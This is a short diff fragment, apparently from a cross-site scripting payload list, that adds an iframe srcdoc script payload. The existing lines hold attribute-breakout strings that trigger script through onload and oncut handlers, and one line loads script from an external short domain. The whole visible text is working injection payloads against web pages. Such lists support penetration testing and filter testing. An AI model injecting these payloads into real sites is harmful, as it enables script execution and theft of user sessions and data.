@@ -26,3 +26,4 @@
 "><script/src=//⑮.rs>
 "><i/oncut=alert()> (CTRL +X )
 "><svg/onload=alert()
+"><iframe srcdoc="<script>alert(1)</script>"></iframe>
